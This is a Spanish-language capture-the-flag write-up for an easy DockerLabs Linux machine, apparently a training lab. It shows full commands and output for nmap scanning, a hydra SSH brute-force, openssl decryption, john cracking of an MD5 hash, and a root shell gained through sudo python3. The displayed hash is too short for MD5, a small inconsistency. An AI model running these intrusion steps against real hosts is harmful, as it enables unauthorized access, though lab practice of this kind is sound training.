Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #criptografia #dockerlabs 

![](../assets/Pasted image 20251103001103.png)

## Reconocimiento

Comenzamos lanzando un nmap para ver todos los puertos abiertos:
```bash
> nmap -p- --open --min-rate 5000 -sS -Pn -n 172.17.0.2 -oN ports.txt
---------------------------------------------------------------------
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Realizamos un escaneo para listar servicios y versiones de los puertos abiertos:
```bash
> sudo nmap -p 22,80 --min-rate 5000 -sS -sCV -Pn -n 172.17.0.2 -oN targeted.txt
---------------------------------------------------------------------------------
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 9e:10:58:a5:1a:42:9d:be:e5:19:d1:2e:79:9c:ce:21 (ECDSA)
|_  256 6b:a3:a8:84:e0:33:57:fc:44:49:69:41:7d:d3:c9:92 (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.62 (Debian)
```

**Presentación Puerto 80 HTTP**

- Al parecer nos comentan que encontremos la password para el usuario _a_
![](../assets/Pasted image 20251102225050.png)

## Explotación

Con la pista anteriormente encontrada procedemos a hacer un ataque de fuerza bruta con hydra para conseguir la clave para el usuario _a_ la cual intuimos será para acceder al servicio ssh

```bash
> hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t 15
-----------------------------------------------------------------------
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: a   password: secret
1 of 1 target successfully completed, 1 valid password found
```

- La password encontrada es _secret_

Nos conectamos port ssh con el usuario _a_
```bash
> ssh a@172.17.0.2
```

Dentro del sistema listamos directorios pero no había nada. Por lo cual decidimos apuntar a la carpeta `/srv` que es donde se suelen encontrar recursos
- Nos dirigimos a la carpeta ftp donde encontramos una buena cantidad de archivos
```bash
a@1f72134edab5:/srv/ftp$ ls                                                        
cifrado_aes.enc    clave_publica.pem  mensaje_hash.txt  pista_fuerza_bruta.txt
clave_aes.txt      hash_a.txt         mensaje_rsa.enc   retos.txt
clave_privada.pem  hash_spencer.txt   original_a.txt    retos_asimetrico.txt
```

Nos bajamos todos los archivos en nuestra maquina:
```bash
> scp a@172.17.0.2:/srv/ftp/* ~/Desktop/
```

El primer archivo que nos llamo la atención fue el archivo llamado `retos.txt`
- Al parecer tenemos que desencriptar cierto archivo para obtener algo
```bash
> cat retos.txt
Cifrado Simétrico: Usa AES para desencriptar el siguiente archivo.
```

Procedimos a desencriptar el archivo con la clave que nos proporcionaron en el archivo llamdo _clave_aes.txt
```bash
> openssl enc -d -aes-128-cbc -in cifrado_aes.enc -out desencriptado_aes.txt -k thisisaverysecretkey!
```

El archivo no fue nada relevante
```bash
> cat desencriptado_aes.txt
Texto original: Hola 
```

Por lo que procedimos al segundo archivo llamado _reto_asimetrico.txt_
```bash
> cat retos_asimetrico.txt
Cifrado Asimétrico: Encuentra la clave privada para desencriptar.
```

Desencriptamos el archivo llamado _mensaje_ con la clave privada que nos proporcionaron.
```bash
> openssl pkeyutl -decrypt -in mensaje_rsa.enc -out desencriptado_rsa.txt -inkey clave_privada.pem
```

El archivo vuelve a no ser relevante:
```bash
> cat desencriptado_rsa.txt
Texto original: Hola A!
```

Por lo cual procedimos con el archivo llamado _mensaje_hash.txt_
```bash
> cat mensaje_hash.txt 
-------------------------------------
Descubre el hash y tendrás la clave...
```

Al parecer tenemos que desencriptar el archivo llamado _hash_spencer.txt_
- spencer seguramente sea un usuario con el cual podamos conectarnos por ssh
```bash
> cat hash_spencer.txt
-------------------------
7c6a180b36896a0a8c02787eeaf
```

Rompemos el hash con **john**

- Contraseña encontrada _password1_
```bash
> sudo john --format=raw-md5 hash_spencer.txt
---------------------------------------------
Proceeding with wordlist:/usr/share/john/password.lst
password1        (?)    
```

Nos conectamos por ssh con el usuario _spencer_

```bash
> ssh spencer@172.17.0.2
```

## Escalada de Privilegios

Lo primero que hacemos es buscar binarios que puedan ser ejecutado como usuario root:
```bash
> spencer@1f72134edab5:~$ sudo -l
---------------------------------
User spencer may run the following commands on 1f72134edab5:
    (ALL) NOPASSWD: /usr/bin/python3
```

- Podemos ejecutar python 

Sabiendo que podemos ejecutar el binario de python procedemos a ejecutarlo como root el usuario 
```bash
> spencer@1f72134edab5:~$ sudo -u root /usr/bin/python3 
```

Dentro del REPL de python procedí a importar el modulo `os` para tener una bash como root
```python
>>> import os
>>> os.system("/bin/bash")
root@1f72134edab5:/home/spencer# whoami
root
```